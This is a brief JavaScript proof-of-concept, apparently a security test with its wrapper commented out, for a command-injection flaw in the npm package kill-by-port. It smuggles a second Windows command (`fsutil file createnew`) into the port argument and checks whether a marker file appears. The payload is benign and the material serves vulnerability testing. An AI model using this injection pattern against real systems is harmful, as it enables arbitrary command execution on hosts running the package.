// test("Command Injection in kill-by-port", () => {
//   expect.assertions(2);
  const kill_by_port = require("kill-by-port");
  const fs = require("fs");
  const path = "./kill-by-port";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  kill_by_port.killByPort(`80 & fsutil file createnew kill-by-port 0`);
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, () => {});
// });
